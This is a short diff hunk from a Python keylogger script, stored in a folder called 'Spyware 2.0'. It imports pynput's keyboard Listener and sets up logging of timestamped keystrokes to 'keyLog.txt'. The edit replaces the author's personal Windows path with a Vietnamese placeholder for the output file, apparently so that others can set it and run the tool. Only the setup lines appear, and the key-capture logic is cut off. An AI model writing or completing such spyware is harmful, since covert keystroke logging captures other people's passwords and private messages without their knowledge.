@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 import logging
 
-log_dir = r"C:\Users\adang\OneDrive\Documents\Python\Spyware 2.0\log"
+log_dir = r"<địa_chỉ_file_xuất_kết_quả>"
 logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 capslockIsOn = False
